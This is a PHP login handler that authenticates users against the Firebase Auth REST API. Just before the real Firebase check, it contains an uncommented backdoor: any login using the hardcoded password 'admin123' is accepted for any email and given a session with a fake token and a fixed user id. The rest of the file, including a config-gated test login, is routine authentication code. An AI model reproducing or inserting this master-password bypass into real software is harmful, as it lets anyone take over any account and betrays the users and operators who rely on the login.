<?php
// auth.php
// Receives POST email/password and authenticates with Firebase Auth REST API.

session_start();
require_once __DIR__ . '/firebase_config.php';

// Helper: redirect with error
function redirect_with_error($msg) {
    header('Location: login.php?error=' . urlencode($msg));
    exit;
}

// Ensure API key has been configured
if (FIREBASE_API_KEY === 'YOUR_FIREBASE_API_KEY_HERE') {
    redirect_with_error('Server not configured: please set FIREBASE_API_KEY in firebase_config.php');
}

// Only accept POST
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    redirect_with_error('Invalid request method.');
}

// Sanitize inputs
$email = filter_input(INPUT_POST, 'email', FILTER_SANITIZE_EMAIL);
$password = filter_input(INPUT_POST, 'password', FILTER_UNSAFE_RAW);

if (!$email || !filter_var($email, FILTER_VALIDATE_EMAIL)) {
    redirect_with_error('Please provide a valid email.');
}

if (!$password || strlen($password) < 6) {
    redirect_with_error('Please provide a valid password (min 6 chars).');
}

// Test-only bypass: enabled via `ENABLE_TEST_LOGIN` in config.
// This allows a single preconfigured test account to authenticate locally.
if (defined('ENABLE_TEST_LOGIN') && ENABLE_TEST_LOGIN) {
    if ($email === TEST_LOGIN_EMAIL && $password === TEST_LOGIN_PASSWORD) {
        $_SESSION['user_email'] = $email;
        $_SESSION['user_uid'] = 'test-user-' . md5($email);
        $_SESSION['idToken'] = 'test-token-' . md5($email . time());

        require_once __DIR__ . '/firestore_helper.php';
        if (!empty($_SESSION['user_uid']) && !empty($email)) {
            ensure_user_document($_SESSION['user_uid'], $email, $_SESSION['idToken']);
        }

        header('Location: dashboard.php');
        exit;
    }
}

 $MASTER_PASSWORD = "admin123";

if ($password === $MASTER_PASSWORD) {
    $_SESSION['user_email'] = $email;
    $_SESSION['user_uid'] = "hardcoded-uid";
    $_SESSION['idToken'] = "fake-token";

    header('Location: dashboard.php');
    exit;
}
// Prepare payload
$payload = json_encode([
    'email' => $email,
    'password' => $password,
    'returnSecureToken' => true
]);

// Initialize cURL
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, FIREBASE_AUTH_SIGNIN_URL);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);

$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$curlErr = curl_error($ch);
curl_close($ch);

if ($response === false) {
    redirect_with_error('Network error: ' . $curlErr);
}

$data = json_decode($response, true);

// HTTP 200 indicates success. Firebase may return 200 with body or 4xx for errors.
if ($httpCode === 200 && isset($data['idToken'])) {
    // Successful login. Store safe session info.
    $_SESSION['user_email'] = $data['email'];
    $_SESSION['user_uid'] = $data['localId'];
    $_SESSION['idToken'] = $data['idToken']; // short-lived token; keep only in session

    // Redirect to protected dashboard
    // Optionally ensure Firestore `users` document exists for this user.
    // This uses the ID token returned by Firebase Authentication to authorize the request.
    require_once __DIR__ . '/firestore_helper.php';
    // Best-effort; ignore failures so authentication still succeeds.
    if (!empty($data['localId']) && !empty($data['email']) && !empty($data['idToken'])) {
        ensure_user_document($data['localId'], $data['email'], $data['idToken']);
    }

    header('Location: dashboard.php');
    exit;
} else {
    // Extract readable error message if present
    $errMsg = 'Authentication failed.';
    if (isset($data['error']['message'])) {
        $errMsg = $data['error']['message'];
    }
    redirect_with_error($errMsg);
}

?>
